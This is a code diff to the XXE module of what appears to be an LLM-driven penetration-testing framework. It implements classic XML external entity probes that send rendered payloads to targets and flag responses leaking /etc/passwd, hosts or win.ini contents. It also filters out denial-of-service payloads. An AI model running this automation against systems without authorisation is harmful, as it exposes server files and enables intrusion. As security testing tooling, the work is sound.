@@ -1,14 +1,14 @@
 from __future__ import annotations
 
-import asyncio  # noqa: F401 — phase 2/3 will need it
+import asyncio  # noqa: F401 — phase 3/4 will need it
 import logging
-import uuid  # noqa: F401 — phase 2/3 will need it
+import uuid  # noqa: F401 — phase 3/4 will need it
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any, ClassVar, List
 from urllib.parse import urlparse
 
-from penage.core.actions import Action, ActionType  # noqa: F401 — phase 2 will use ActionType
+from penage.core.actions import Action, ActionType
 from penage.core.candidates import CandidateAction
 from penage.core.observations import Observation
 from penage.core.state import State
@@ -17,12 +17,12 @@ from penage.llm.base import LLMClient
 from penage.memory.store import MemoryStore
 from penage.specialists.base import AsyncSpecialist, SpecialistConfig
 from penage.specialists.shared.oob_listener import OobListener
-from penage.specialists.shared.xml_utils import (  # noqa: F401 — phase 2/3 will use builders/detector
+from penage.specialists.shared.xml_utils import (
     XmlSafetyFilter,
     XxeSignalFamily,
     build_classic_payload,
-    build_oob_blind_payload,
-    build_parameter_entity_payload,
+    build_oob_blind_payload,  # noqa: F401 — phase 4 will use it
+    build_parameter_entity_payload,  # noqa: F401 — phase 3 will use it
     detect_xxe_markers,
 )
 from penage.tools.http_backend import HttpBackend
@@ -154,8 +154,6 @@ class XxeSpecialist(AsyncSpecialist):
     async def propose_async(
         self, state: State, *, config: SpecialistConfig
     ) -> List[CandidateAction]:
-        # В этой сессии: discovery → log → return [].
-        # Реальное выстреливание пейлоадов — в 2.7b-ii.
         if self._done or self.http_tool is None:
             return self._emit_if_any()
 
@@ -166,16 +164,65 @@ class XxeSpecialist(AsyncSpecialist):
             self._note(f"xxe:insufficient_budget cap={self.max_http_budget}")
             return []
 
+        budgeted = _BudgetedHttpTool(self.http_tool, state, cap=self.max_http_budget)
         step = int(getattr(state, "orch_step", 0))
+
         for target in targets[: self.max_targets]:
+            key = f"{target.url}|{target.delivery}|{target.parameter}"
+            if key in self._attempted:
+                continue
+            if budgeted.remaining < self.min_reserve_http:
+                self._note(f"xxe:budget_low remaining={budgeted.remaining}")
+                break
+
+            host = _host_of(target.url)
             self._trace_phase(1, "target_discovery", step=step, target=target)
 
-        return []
+            self._trace_phase(
+                2, "classic_system_probes", step=step, target=target,
+            )
+            finding = await self._run_classic_phase(
+                target=target,
+                http_tool=budgeted,
+                host=host,
+                config=config,
+                step=step,
+            )
+            if finding and finding.get("verified"):
+                self._findings.append(finding)
+                self._done = True
+                self._attempted.add(key)
+                break
+
+            # Phases 3-5 — next sessions.
+            self._attempted.add(key)
+
+        return self._emit_if_any()
 
     def _emit_if_any(self) -> List[CandidateAction]:
-        # В этой сессии: findings всегда пусто, возвращаем [].
-        # Реальная логика — в 2.7d.
-        return []
+        verified = [f for f in self._findings if f.get("verified")]
+        if not verified:
+            return []
+        finding = verified[-1]
+        action = Action(
+            type=ActionType.NOTE,
+            params={"kind": "xxe_finding", "finding": finding},
+            tags=[
+                "xxe",
+                "verified",
+                finding.get("family") or finding.get("kind", "unknown"),
+            ],
+        )
+        return [
+            CandidateAction(
+                action=action,
+                source=self.name,
+                score=12.0,
+                cost=0.0,
+                reason=finding.get("summary") or "XXE finding",
+                metadata={"evidence": finding},
+            )
+        ]
 
     # ------------------------------------------------------------------
     # Phase 1 — target discovery
@@ -285,8 +332,144 @@ class XxeSpecialist(AsyncSpecialist):
     # Phases 2-5 — implemented in subsequent sessions
     # ------------------------------------------------------------------
 
-    async def _run_classic_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
-        raise NotImplementedError("Implemented in 2.7b-ii")
+    async def _run_classic_phase(
+        self,
+        *,
+        target: _XxeTarget,
+        http_tool: _BudgetedHttpTool,
+        host: str,
+        config: SpecialistConfig,
+        step: int,
+    ) -> dict[str, Any] | None:
+        """Phase 2: classic SYSTEM-entity probes.
+
+        Categories used: ``classic-unix``, ``classic-windows``,
+        ``error-based``, ``no-doctype-sanity``, ``soap-wrapped``.
+        ``parameter_entity-*`` and ``oob_blind-*`` are handled by phases 3/4
+        (not yet implemented).
+
+        Returns a verified finding dict on a strong marker hit, ``None``
+        otherwise. Per-probe observations (including weak signals) are
+        accumulated into ``self._observations`` for phase 5 candidate
+        assembly.
+        """
+        _ = (config, step)
+        entries = self._load_yaml_entries(
+            categories=(
+                "classic-unix",
+                "classic-windows",
+                "error-based",
+                "no-doctype-sanity",
+                "soap-wrapped",
+            ),
+            limit=self.max_classic_payloads,
+        )
+
+        key = f"{target.url}|{target.delivery}|{target.parameter}"
+
+        for entry in entries:
+            if http_tool.remaining < 2:
+                break
+
+            payload = self._render_payload(entry, oob_url=None)
+            if payload is None:
+                # parameter_entity / oob_blind / incomplete entry — skip.
+                continue
+
+            verdict = self._safety_filter.check(payload)
+            if not verdict.allowed:
+                self._note(
+                    f"xxe:dos_payload_dropped id={entry.get('id', '?')} "
+                    f"reason={verdict.reason}"
+                )
+                continue
+
+            action_params = self._build_delivery(target, payload, entry)
+            action = Action(type=ActionType.HTTP, params=action_params)
+            obs = await http_tool.run(action)
+
+            if not obs.ok or not isinstance(obs.data, dict):
+                self._record_attempt(
+                    host=host,
+                    parameter=(target.parameter or "__body__"),
+                    payload=payload[:200],
+                    outcome="error",
+                )
+                continue
+
+            body = str(obs.data.get("text_full") or "")
+            status = obs.data.get("status_code")
+            hits = detect_xxe_markers(body)
+
+            self._observations.setdefault(key, []).append(
+                {
+                    "payload_id": entry.get("id", "?"),
+                    "status": status,
+                    "body_excerpt": body[:300],
+                    "xml_parse_error": any(
+                        h.family == XxeSignalFamily.XML_PARSE_ERROR
+                        for h in hits
+                    ),
+                    "hits": [h.family.value for h in hits],
+                }
+            )
+
+            strong_families = {
+                XxeSignalFamily.UNIX_PASSWD,
+                XxeSignalFamily.UNIX_HOSTS,
+                XxeSignalFamily.WIN_INI,
+                XxeSignalFamily.WIN_HOSTS,
+                XxeSignalFamily.ENTITY_EXPANSION,
+            }
+            strong_hit = next(
+                (h for h in hits if h.family in strong_families), None
+            )
+            if strong_hit is not None:
+                self._record_attempt(
+                    host=host,
+                    parameter=(target.parameter or "__body__"),
+                    payload=payload[:200],
+                    outcome="verified_classic",
+                )
+                return {
+                    "verified": True,
+                    "kind": "xxe_classic_disclosure",
+                    "mode": "classic",
+                    "delivery": target.delivery,
+                    "parameter": target.parameter,
+                    "payload_id": entry.get("id", "?"),
+                    "channel": target.channel,
+                    "url": target.url,
+                    "family": strong_hit.family.value,
+                    "evidence": {
+                        "markers": [
+                            {
+                                "family": h.family.value,
+                                "marker": h.marker,
+                                "snippet": h.snippet,
+                            }
+                            for h in hits[:5]
+                        ],
+                        "response_excerpt": body[:500],
+                        "http_status": status,
+                        "content_type": target.content_type,
+                        "yaml_id": entry.get("id", "?"),
+                    },
+                    "summary": (
+                        f"XXE disclosure of {strong_hit.family.value} "
+                        f"via {target.delivery}="
+                        f"{target.parameter or 'body'}"
+                    ),
+                }
+
+            self._record_attempt(
+                host=host,
+                parameter=(target.parameter or "__body__"),
+                payload=payload[:200],
+                outcome="no_signal",
+            )
+
+        return None
 
     async def _run_param_entity_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
         raise NotImplementedError("Implemented in 2.7c")
@@ -297,11 +480,110 @@ class XxeSpecialist(AsyncSpecialist):
     def _finalize_candidate(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
         raise NotImplementedError("Implemented in 2.7d")
 
-    def _render_payload(self, *args: Any, **kwargs: Any) -> str:
-        raise NotImplementedError("Implemented in 2.7b-ii")
+    def _render_payload(
+        self, entry: dict[str, Any], *, oob_url: str | None
+    ) -> str | None:
+        """Render a yaml entry into a ready-to-send XML string.
 
-    def _build_delivery(self, *args: Any, **kwargs: Any) -> tuple[str, dict[str, Any]]:
-        raise NotImplementedError("Implemented in 2.7b-ii")
+        Dispatches on the entry's ``template`` field, with ``category``
+        taking precedence for ``soap-wrapped``, ``error-based``, and
+        ``no-doctype-sanity`` — these categories describe the *structural
+        delivery shell* rather than the raw template family, and the yaml
+        encodes them in ``category`` while keeping ``template`` at the
+        underlying shape (usually ``classic``).
+
+        Returns ``None`` for ``parameter_entity`` / ``oob_blind`` templates
+        (handled by phases 3/4) and for entries that lack the data required
+        to render (e.g. empty URI).
+        """
+        _ = oob_url
+        category = str(entry.get("category") or "")
+        if category in {"soap-wrapped", "error-based", "no-doctype-sanity"}:
+            template_kind = category
+        else:
+            template_kind = str(entry.get("template") or "classic")
+
+        uri = str(entry.get("uri") or "")
+        entity_name = str(entry.get("entity_name") or "xxe")
+
+        if template_kind == "oob_blind":
+            return None  # phase 4.
+        if template_kind == "parameter_entity":
+            return None  # phase 3.
+
+        if template_kind == "classic":
+            if not uri:
+                return None
+            return build_classic_payload(uri, entity_name=entity_name)
+
+        if template_kind == "soap-wrapped":
+            if not uri:
+                return None
+            inner = build_classic_payload(uri, entity_name=entity_name)
+            # Drop the <?xml ...?> declaration from the inner body; the
+            # outer envelope carries its own.
+            if "?>" in inner:
+                inner = inner.split("?>\n", 1)[-1]
+            return (
+                '<?xml version="1.0" encoding="UTF-8"?>\n'
+                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
+                '  <soap:Body>\n'
+                f'    {inner}\n'
+                '  </soap:Body>\n'
+                '</soap:Envelope>'
+            )
+
+        if template_kind == "error-based":
+            raw = entry.get("payload")
+            if raw:
+                out = str(raw)
+                out = out.replace("{URI}", uri)
+                out = out.replace("{ENTITY_NAME}", entity_name)
+                return out
+            if uri:
+                return build_classic_payload(uri, entity_name=entity_name)
+            return None
+
+        if template_kind == "no-doctype-sanity":
+            return '<?xml version="1.0"?>\n<root>ok</root>'
+
+        return None
+
+    def _build_delivery(
+        self,
+        target: _XxeTarget,
+        xml_payload: str,
+        entry: dict[str, Any],
+    ) -> dict[str, Any]:
+        """Assemble the ``action.params`` dict for ``http_tool``.
+
+        For ``delivery="body"`` the XML string rides as the raw request
+        body with a matching Content-Type. For ``delivery="param"`` the
+        XML string is assigned to a form field; httpx picks the
+        form-urlencoded Content-Type automatically.
+        """
+        ct = str(
+            entry.get("content_type")
+            or target.content_type
+            or "application/xml"
+        )
+        channel = target.channel.upper() if target.channel else "POST"
+        if channel not in {"POST", "PUT"}:
+            channel = "POST"
+
+        if target.delivery == "body":
+            return {
+                "method": channel,
+                "url": target.url,
+                "data": xml_payload,
+                "headers": {"Content-Type": ct},
+            }
+
+        return {
+            "method": channel,
+            "url": target.url,
+            "data": {target.parameter: xml_payload},
+        }
 
     # ------------------------------------------------------------------
     # Helpers (structurally aligned with LfiSpecialist)
@@ -327,7 +609,9 @@ class XxeSpecialist(AsyncSpecialist):
         for entry in self._yaml_cache:
             if entry.get("category") not in allowed:
                 continue
-            if not str(entry.get("payload") or ""):
+            # An entry is usable if it carries either a URI (rendered from a
+            # template) or an explicit raw ``payload`` string (error-based).
+            if not str(entry.get("uri") or "") and not str(entry.get("payload") or ""):
                 continue
             out.append(entry)
             if len(out) >= max(0, int(limit)):
@@ -417,6 +701,10 @@ def _load_xxe_library(path: Path) -> list[dict[str, Any]]:
             {
                 "id": str(item.get("id") or ""),
                 "category": str(item.get("category") or ""),
+                "template": str(item.get("template") or ""),
+                "uri": str(item.get("uri") or ""),
+                "entity_name": str(item.get("entity_name") or ""),
+                "content_type": str(item.get("content_type") or ""),
                 "family": str(item.get("family") or ""),
                 "payload": str(item.get("payload") or ""),
                 "expected_markers": list(item.get("expected_markers") or []),
